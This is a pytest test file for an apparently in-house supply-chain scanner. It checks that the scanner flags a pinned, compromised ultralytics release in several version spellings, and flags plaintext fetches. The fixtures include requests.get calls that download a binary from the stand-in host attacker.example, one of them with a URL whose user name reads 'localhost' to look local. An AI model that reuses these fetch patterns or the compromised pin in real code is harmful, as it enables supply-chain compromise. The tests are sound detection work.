"""A compromised pin and a plaintext fetch are found however the manifest or URL spells them."""

import json
from pathlib import Path

import pytest
from guardana.cli.main import app
from typer.testing import CliRunner

runner = CliRunner()


def _found(tmp_path: Path, name: str, text: str) -> list[str]:
    tree = tmp_path / "tree"
    tree.mkdir()
    (tree / name).write_text(text, encoding="utf-8")
    saved = tmp_path / "run.json"
    runner.invoke(app, ["scan", str(tree), "--format", "json", "--output", str(saved)])
    document = json.loads(saved.read_text(encoding="utf-8"))
    return [finding["rule_id"] for finding in document["findings"]]


def test_control_the_compromised_release_pinned_plainly_is_found(tmp_path: Path) -> None:
    found = _found(tmp_path, "requirements.txt", "ultralytics==8.3.41\n")

    assert "guardana.supply_chain.malicious_dependency" in found


@pytest.mark.parametrize(
    "pin", ["ultralytics==8.3.041", "ultralytics===8.3.41", "ultralytics==8.3.41.0"]
)
def test_the_compromised_release_is_found_in_every_spelling_pip_installs(
    tmp_path: Path, pin: str
) -> None:
    found = _found(tmp_path, "requirements.txt", f"{pin}\n")

    assert "guardana.supply_chain.malicious_dependency" in found


_FETCH = "import requests\n\nrequests.get('{url}', timeout=5)\n"


def test_control_a_plaintext_fetch_from_an_external_host_is_found(tmp_path: Path) -> None:
    found = _found(tmp_path, "fetch.py", _FETCH.format(url="http://attacker.example/w.bin"))

    assert "guardana.supply_chain.insecure_transport" in found


def test_a_plaintext_fetch_whose_user_name_is_localhost_is_found(tmp_path: Path) -> None:
    url = "http://localhost:password@attacker.example/w.bin"

    found = _found(tmp_path, "fetch.py", _FETCH.format(url=url))

    assert "guardana.supply_chain.insecure_transport" in found
